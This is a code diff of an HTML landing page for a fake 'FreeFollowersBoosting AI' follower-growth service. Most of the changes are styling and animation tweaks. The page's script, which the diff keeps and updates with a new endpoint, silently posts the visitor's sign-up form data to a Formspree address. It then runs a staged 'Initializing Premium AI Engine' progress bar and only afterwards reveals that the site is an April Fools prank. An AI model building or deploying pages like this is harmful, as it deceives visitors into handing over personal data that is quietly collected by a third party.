@@ -7,7 +7,7 @@
   <style>
     :root {
       --bg: #0a0a0a;
-      --surface: #18181b;
+      --surface: rgba(24, 24, 27, 0.8);
       --accent: #00ff9d;
       --text: #e4e4e7;
       --muted: #a1a1aa;
@@ -18,6 +18,7 @@
       background: var(--bg); 
       color: var(--text); 
       line-height: 1.6;
+      -webkit-tap-highlight-color: transparent;
     }
     .hero {
       background: linear-gradient(135deg, #111113, #1f1f23);
@@ -26,6 +27,7 @@
     }
     h1 { font-size: 3.2rem; margin: 0 0 16px; font-weight: 700; }
     .tagline { font-size: 1.5rem; color: var(--muted); max-width: 700px; margin: 0 auto 40px; }
+    
     .btn {
       padding: 16px 48px;
       font-size: 1.2rem;
@@ -35,11 +37,24 @@
       border-radius: 50px;
       cursor: pointer;
       font-weight: 600;
-      transition: all 0.3s;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 4px 14px 0 rgba(0, 255, 157, 0.39);
     }
     .btn:hover { background: #00cc7a; transform: translateY(-2px); }
+    .btn:active { transform: scale(0.98); }
+
     .section { padding: 80px 20px; max-width: 1100px; margin: auto; }
-    .card { background: var(--surface); padding: 40px; border-radius: 20px; }
+    
+    /* Glassmorphism Card Style */
+    .card { 
+      background: var(--surface); 
+      padding: 40px; 
+      border-radius: 24px; 
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
     .form-container { max-width: 480px; margin: 40px auto; }
     input, select {
       width: 100%;
@@ -50,7 +65,9 @@
       border-radius: 12px;
       color: var(--text);
       font-size: 1.05rem;
+      box-sizing: border-box;
     }
+    
     .live-counter {
       text-align: center;
       font-size: 1.4rem;
@@ -59,7 +76,19 @@
       border-radius: 16px;
       margin: 40px auto;
       max-width: 400px;
+      border: 1px solid #333;
     }
+
+    /* Mobile Responsive Tweaks */
+    @media (max-width: 600px) {
+      h1 { font-size: 2.2rem; }
+      .tagline { font-size: 1.1rem; }
+      .btn { width: 100%; padding: 18px; }
+      .hero { padding: 80px 20px 60px; }
+      .section { padding: 40px 20px; }
+      .card { padding: 25px; }
+    }
+
     .loading-screen {
       display: none;
       position: fixed;
@@ -83,14 +112,13 @@
       justify-content: center;
       flex-direction: column;
       text-align: center;
-      padding: 40px;
+      padding: 20px;
     }
     .confetti { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999; }
   </style>
 </head>
 <body>
 
-  <!-- HERO -->
   <div id="home">
     <div class="hero">
       <h1>FreeFollowersBoosting AI</h1>
@@ -128,7 +156,6 @@
     </div>
   </div>
 
-  <!-- SIGN UP FORM -->
   <div id="signup" style="display:none; padding:60px 20px; background:#0f0f11;">
     <div class="card form-container">
       <h2 style="text-align:center;">Create Your Account</h2>
@@ -165,9 +192,8 @@
     </div>
   </div>
 
-  <!-- LOADING SCREEN -->
   <div id="loading" class="loading-screen">
-    <div style="max-width:420px; width:100%;">
+    <div style="max-width:420px; width:100%; padding: 0 20px;">
       <h2>Initializing Premium AI Engine...</h2>
       <div id="progressText" style="margin:30px 0; font-size:1.3rem; color:var(--accent);">Analyzing your profile • 0%</div>
       
@@ -185,18 +211,17 @@
     </div>
   </div>
 
-  <!-- APRIL FOOLS REVEAL -->
   <div id="reveal" class="reveal">
     <canvas id="confetti" class="confetti"></canvas>
-    <h1 style="font-size:3.8rem; margin:0;">😂 APRIL FOOLS!</h1>
-    <p style="font-size:2.2rem; margin:20px 0;">Sope oti lor! 😂</p>
-    <p style="max-width:620px; font-size:1.35rem; line-height:1.7;">
-      No AI tool can magically deliver thousands of real, engaged followers overnight — not even a premium one.<br><br>
+    <h1 style="font-size:3rem; margin:0;">😂 APRIL FOOLS!</h1>
+    <p style="font-size:1.8rem; margin:10px 0;">Sope oti lor! 😂</p>
+    <p style="max-width:620px; font-size:1.1rem; line-height:1.6;">
+      No AI tool can magically deliver thousands of real, engaged followers overnight.<br><br>
       Real growth comes from creating consistent, high-value content and genuinely connecting with your audience.
     </p>
     <br>
     <button class="btn" onclick="location.reload()" style="background:#fff; color:#000;">Prank Someone Else →</button>
-    <p style="margin-top:60px; font-size:1rem; color:var(--muted);">Happy April Fools from the FreeFollowersBoosting AI team</p>
+    <p style="margin-top:40px; font-size:0.9rem; color:var(--muted);">Happy April Fools from the FreeFollowersBoosting AI team</p>
   </div>
 
   <script>
@@ -210,6 +235,7 @@
     function showSignup() {
       document.getElementById('home').style.display = 'none';
       document.getElementById('signup').style.display = 'block';
+      window.scrollTo(0,0);
     }
 
     async function handleSubmit(e) {
@@ -221,16 +247,20 @@
       // Hide form immediately and show loading
       document.getElementById('signup').style.display = 'none';
       document.getElementById('loading').style.display = 'flex';
+      window.scrollTo(0,0);
 
-      // Submit silently to the NEW Formspree endpoint
-      fetch('https://formspree.io/f/xbdpbqpg', {
+      // NEW Formspree endpoint
+      fetch('https://formspree.io/f/xkopeegq', {
         method: 'POST',
-        body: formData
+        body: formData,
+        headers: {
+            'Accept': 'application/json'
+        }
       }).catch(err => {
-        console.error('Formspree submission error:', err); // hidden from user
+        console.error('Formspree error:', err);
       });
 
-      // Start the 90-second fake loading animation
+      // Start the loading animation
       startFakeLoading();
     }
 
@@ -244,15 +274,15 @@
         document.getElementById('step5')
       ];
 
-      const duration = 90000; // 90 seconds
-      const intervalTime = 800;
+      const duration = 25000; // Reduced to 25 seconds for better mobile UX
+      const intervalTime = 500;
 
       const interval = setInterval(() => {
         progress += (intervalTime / duration) * 100;
         if (progress > 100) progress = 100;
 
         document.getElementById('progressBar').style.width = progress + '%';
-        document.getElementById('progressText').textContent = `Processing AI growth engine • ${Math.floor(progress)}%`;
+        document.getElementById('progressText').textContent = `Processing AI engine • ${Math.floor(progress)}%`;
 
         const currentStep = Math.floor((progress / 100) * steps.length);
         for (let i = 0; i < steps.length; i++) {
@@ -265,7 +295,7 @@
             document.getElementById('loading').style.display = 'none';
             document.getElementById('reveal').style.display = 'flex';
             launchConfetti();
-          }, 1200);
+          }, 800);
         }
       }, intervalTime);
     }
@@ -279,12 +309,12 @@
       const colors = ['#00ff9d', '#ffffff', '#a1a1aa', '#00cc7a'];
       let pieces = [];
 
-      for (let i = 0; i < 280; i++) {
+      for (let i = 0; i < 200; i++) {
         pieces.push({
           x: Math.random() * canvas.width,
           y: Math.random() * canvas.height - canvas.height,
-          r: Math.random() * 7 + 5,
-          d: Math.random() * 5 + 3,
+          r: Math.random() * 6 + 4,
+          d: Math.random() * 5 + 2,
           color: colors[Math.floor(Math.random()*colors.length)],
           tilt: Math.random() * 20 - 10,
           tiltAngle: 0
@@ -294,14 +324,14 @@
       function draw() {
         ctx.clearRect(0, 0, canvas.width, canvas.height);
         pieces.forEach((p, i) => {
-          p.tiltAngle += 0.08;
+          p.tiltAngle += 0.1;
           p.y += p.d;
           p.tilt = Math.sin(p.tiltAngle) * 12;
           ctx.beginPath();
           ctx.lineWidth = p.r / 2;
           ctx.strokeStyle = p.color;
           ctx.moveTo(p.x + p.tilt, p.y);
-          ctx.lineTo(p.x + p.tilt + p.r, p.y + p.r * 1.8);
+          ctx.lineTo(p.x + p.tilt + p.r, p.y + p.r * 1.5);
           ctx.stroke();
 
           if (p.y > canvas.height) pieces.splice(i, 1);
@@ -311,7 +341,6 @@
       draw();
     }
 
-    // Resize handler for confetti
     window.addEventListener('resize', () => {
       const c = document.getElementById('confetti');
       if (c) {
@@ -321,4 +350,5 @@
     });
   </script>
 </body>
-</html>
+  </html>
+        
